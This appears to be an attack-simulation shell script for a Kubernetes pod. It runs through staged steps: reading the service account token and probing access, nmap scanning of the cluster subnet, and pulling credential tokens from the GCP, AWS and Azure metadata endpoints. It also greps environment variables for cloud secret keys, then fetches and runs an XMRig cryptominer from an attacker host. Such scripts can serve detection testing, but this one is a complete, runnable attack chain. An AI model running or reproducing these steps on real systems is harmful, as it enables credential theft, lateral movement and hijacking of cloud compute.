#!/bin/sh

# recon
echo "--- Reconnaissance ---"
echo "Checking read permissions for other pods via SelfSubjectAccessReview api request"
kubetoken=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`
body='{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{"resourceAttributes":{"namespace":"default","verb":"get","resource":"pods"}},"status":{}}'
accessReview=`curl -s -k -A "kubectl" -H "Authorization: Bearer $kubetoken"  -H "Content-Type: application/json" -X POST -d $body "https://kubernetes.default/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"| grep -Po '"status":\{\K.*?(?=\})'`
echo "Results:  $accessReview"
echo " "
echo "Searching for pods listening on port 443 via Nmap: "
nmap  -Pn --open kubernetes.default/24 -p 443
echo " "

# lateral-mov
echo "--- Lateral Movement ---"
echo "Sending request to IMDS to retrieve cloud identity token"
if (token=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"| grep -Po '"access_token":"\K.*?(?=")')); then
    cloud="gcp"
elif (awstoken=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")); then
    cloud="aws"
    roles=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials" -H "X-aws-ec2-metadata-token: $awstoken")
    for role in $roles; do
        token=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -H "X-aws-ec2-metadata-token: $awstoken" | grep -Po '"Token" : "\K.*?(?=")')
        test $token && echo "$cloud token for role : $token" | head -c 50 && echo "..."
    done
    test $token  || echo "no token found"
else
    cloud="az"
    token=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | grep -Po '"access_token":"\K.*?(?=")')
fi
test $token && echo "$cloud token: $token" | head -c 50 && echo "..." || echo "no token found"
echo " "

# secrets
echo "--- Secrets Gathering ---"
echo "searching for kubernetes service account token"
if (test -f "/var/run/secret/kubernetes.io/serviceaccount/token"); then
    echo "found Kubernetes service account in /var/run/secret/kubernetes.io/serviceaccount/token"
    cat /var/run/secret/kubernetes.io/serviceaccount/token | head -c 50 && echo "..."
    echo " "
else
    echo "Kubernetes service account token not found"
    echo " "
fi
echo "looking for secrets in environment variables"
case $cloud in 
    gcp)
        set | grep GOOGLE_DEFAULT_CLIENT_SECRET= || echo "variable not found"
        ;;
    aws)
        set | grep AWS_SECRET_ACCESS_KEY= || echo "variable not found"
        ;;
    *)
        set | grep AZURE_CREDENTIAL_FILE= || echo "variable not found"
        ;;
    esac
echo " "

# crypto
echo "--- Cryptomining ---"
echo "Optimizing host for mining"
/sbin/modprobe msr allow_writes=on > /dev/null 2>&1
touch /etc/ld.so.preload 
echo "Downloading and running Xmrig crypto miner"
curl -s "http://$NAME-attacker/xmrig" -o xmrig && chmod +x xmrig && ./xmrig
echo " "